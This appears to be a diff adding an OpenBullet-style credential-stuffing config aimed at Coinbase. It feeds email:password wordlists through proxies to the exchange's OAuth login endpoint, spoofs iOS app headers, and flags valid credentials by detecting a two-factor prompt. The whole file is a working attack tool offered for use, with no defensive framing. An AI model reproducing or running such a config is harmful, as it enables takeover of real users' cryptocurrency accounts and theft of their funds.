@@ -1,0 +1,84 @@
+[SETTINGS]
+{
+  "Name": "COINBASE.com",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2020-09-03T17:46:43.326291+04:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOG REQUEST POST "https://api.coinbase.com/oauth/authorize/with-credentials" 
+  CONTENT "client_id=6011662b0badfa97f9fed5a246526277ff2116affa98cfaacacd012a191ba38d&password=<PASS>&redirect_uri=2_legged&scope=all&username=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: api.coinbase.com" 
+  HEADER "X-Os-Name: iOS" 
+  HEADER "User-Agent: Coinbase/6.24.0 (com.vilcsak.bitcoin2; build:10075; iOS 13.3) Alamofire/4.7.0" 
+  HEADER "X-Device-Model: iPhone 8 Plus" 
+  HEADER "X-Device-Manufacturer: Apple" 
+  HEADER "X-IDFA: 00000000-0000-0000-0000-000000000000" 
+  HEADER "CB-CLIENT: com.vilcsak.bitcoin2/6.24.0/10075" 
+  HEADER "CB-VERSION: 2019-04-16" 
+  HEADER "X-Os-Version: 13.2.3" 
+  HEADER "X-App-Build-Number: 10075" 
+  HEADER "X-IDFV: D58F02C9-D2BB-446E-AA5C-AD5ADBD4DF11" 
+  HEADER "Content-Length: 146" 
+  HEADER "X-App-Version: 6.24.0" 
+  HEADER "X-Locale: fr_FR" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Language: fr-FR" 
+  HEADER "cb-rfm: 1576356325" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=utf-8" 
+  HEADER "X-Timezone-Offset: 3600" 
+  HEADER "Accept-Encoding: gzip;q=1.0, compress;q=0.5" 
+  HEADER "X-Device-Brand: Apple" 
+
+#KEY KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "incorrect_credentials" 
+  KEYCHAIN Success OR 
+    KEY "2fa_authentication\":\"" 
+  
